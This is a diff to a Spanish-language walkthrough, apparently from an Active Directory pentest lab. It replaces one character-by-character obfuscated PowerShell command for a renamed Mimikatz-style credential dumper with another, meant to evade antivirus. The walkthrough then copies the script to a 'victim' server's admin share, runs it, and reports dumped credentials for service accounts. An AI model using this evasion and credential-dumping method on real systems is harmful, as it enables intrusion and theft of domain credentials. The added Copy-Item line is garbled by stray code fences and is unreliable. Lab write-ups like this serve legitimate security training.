@@ -227,31 +227,67 @@ Vamos a crear el nuevo *Invoke-TheKat* le llamaremos de la siguiente forma: *Inv
 Primero tendremos que crear una copia del  *Invoke-TheKat* original y cambiarle el nombre a *Invoke-TheKatEx-keys-std97.ps1*
 Una vez le hayamos cambiado el nombre le damos clic derecho y editar, tendremos que sustituir el contenido de las ultimas líneas por:
 ```shell
-$8 = "s";
-$c = "e";
-$g = "k";
-$t = "u";
-$p = "r";
-$n = "l";
-$7 = "s";
-$6 = "a";
-$l = ":";
-$2 = ":";
-$z = "e";
-$e = "k";
-$0 = "e";
-$s = "y";
-$1 = "s";
-$Pwn = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s + $1 ;
-Invoke-Mimi -Command $Pwn
+$jq = "t";
+$hk = "o";
+$cr = "k";
+$dg = "e";
+$z3 = "n";
+$y4 = ":";
+$fq = ":";
+$67 = "e";
+$qj = "v";
+$27 = "a";
+$yt = "s";
+$ws = "i";
+$h4 = "v";
+$li = "e";
+$tv = "-";
+$2h = "e";
+$qx = "l";
+$lx = "e";
+$l1 = "v";
+$68 = "a";
+$5d = "t";
+$ny = "e";
+$25 = " ";
+$d9 = "s";
+$9z = "e";
+$8x = "k";
+$r2 = "u";
+$6x = "r";
+$zq = "l";
+$06 = "s";
+$td = "a";
+$hb = ":";
+$gz = ":";
+$nx = "e";
+$0n = "v";
+$qz = "a";
+$ct = "s";
+$mj = "i";
+$ue = "v";
+$sf = "e";
+$2c = "-";
+$9u = "e";
+$hp = "k";
+$x0 = "e";
+$yb = "y";
+$r1 = "s";
+$Pwn = $jq + $hk + $cr + $dg + $z3 + $y4 + $fq + $67 + $qj + $27 + $yt + $ws + $h4 + $li + $tv + $2h + $qx + $lx + $l1 + $68 + $5d + $ny + $25 + $d9 + $9z + $8x + $r2 + $6x + $zq + $06 + $td + $hb + $gz + $nx + $0n + $qz + $ct + $mj + $ue + $sf + $2c + $9u + $hp + $x0 + $yb + $r1 ;
+
+Invoke-TheKat -Command $Pwn
 ```
 
 Ahora una vez el archivo modificado lo transferiremos a la maquina victima
 ```shell
-Copy-Item C:\AD\Tools\Invoke-MimiEX-keys-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+Copy-Item C:\AD\Tools\Invoke-```
+TheKatEx-keys
+```-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 ```
 
 Una vez copiado en la maquina victima nos vamos al directorio donde lo hemos copiado en este caso *Program Files* y lo ejecutamos
 ```shell
-.\Invoke-MimiEX-keys-std97.ps1
+.\Invoke-TheKatEx-keys-std97.ps1
 ```
+
+Encontrando las credenciales de diferentes usuarios como *srvadmin*, *appadmin* y *websvc*
